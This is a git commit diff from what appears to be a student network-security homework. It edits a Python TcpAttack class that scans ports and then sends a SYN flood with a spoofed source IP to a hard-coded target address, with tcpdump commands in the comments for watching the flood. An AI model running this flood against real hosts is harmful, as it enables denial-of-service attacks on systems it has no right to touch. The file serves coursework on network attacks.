8713681e25561389a5691896b62a682ae84cc512
Vivek Shashank Khanolkar <vkhanolk@ecegrid-thin2.ecn.purdue.edu>
2021-03-29 21:41:04 -0400

    done

--- HW8/TcpAttack.py
+++ HW8/TcpAttack.py
@@ -19,7 +19,7 @@ class TcpAttack:
     
     def scanTarget(self, rangeStart, rangeEnd): # NOTE : code modified from Professor Avi Kak's Lecture 16 port_scan.py
         open_ports = []
-
+        count = 0
         outFile = open('openports.txt', 'w')
         # Scan the ports in the specified range:
         for testport in range(rangeStart, rangeEnd+1):                               
@@ -28,8 +28,10 @@ class TcpAttack:
             try:                                                                     
                 sock.connect( (self.targetIP, testport) )                                 
                 open_ports.append(testport)                                                                                         
-            except:                                                                  
-                print("port is closed")                                                
+            except:   
+                count = count + 1
+                # print("port", count)                                                               
+                pass #do nothing                              
 
         for x in open_ports:
             outFile.write("%s\n" % x)
@@ -41,7 +43,18 @@ class TcpAttack:
             enc = myFile.readlines()
 
         inc = [int(x) for x in enc]
-        if port in inc:             #if our port is open
+
+        # sock = socket.socket( socket.AF_INET, socket.SOCK_STREAM )  
+        # flag = 0
+        # try:
+        #     sock.connect( (self.target, port) )
+        #     flag = 1
+        # except:
+        #     pass #do nothing
+        #if flag = 1:
+
+        if port in inc:             #if our port is open 
+            print("OPEN")
             for i in range(numSyn):                                                       
                 IP_header = IP(src = self.spoofIP, dst = self.targetIP)                                
                 TCP_header = TCP(flags = "S", sport = RandShort(), dport = port)     
@@ -49,22 +62,25 @@ class TcpAttack:
                 try:                                                                     
                     send(packet)                                                          
                 except:                                                   
-                    print (e)    
+                    pass    
             return 1
         else:
             return 0                                                           
 
 #10.0.0.8 is machine i am attacking
-#ON ATTACKER MACHINE (MINE): sudo tcpdump -vvv -nn -i wlan0 -s 1500 -S -X ’dst 10.0.0.8’
+#ON ATTACKER MACHINE (MINE): sudo tcpdump -vvv -nn -i wlan0 -s 1500 -S -X 'dst 128.46.4.84'
 
 #10.0.0.19 is spoofed address of attacker
-#ON THE ATTACKED MACHINE: sudo tcpdump -vvv -nn -i wlan0 -s 1500 -S -X ’src 10.0.0.19’
+#ON THE ATTACKED MACHINE: sudo tcpdump -vvv -nn -i wlan0 -s 1500 -S -X 'src 123.12.1.12'
 if __name__ == '__main__':
-    spoofIP = '123.12.1.12'
-    targetIP = '128.46.4.84'
+    spoofIP = '123.12.1.12' #address I am faking
+    targetIP = '128.46.4.61' #address I am attacking
     rangeStart = 1
     rangeEnd = 200
+    port = 110
     Tcp = TcpAttack(spoofIP, targetIP)
     Tcp.scanTarget(rangeStart, rangeEnd)
-    if Tcp.attackTarget(port, 22):
+    if Tcp.attackTarget(port, 10):
         print('port was open to attack')
+    else:
+        print('port CLOSED, NOT open to attack')
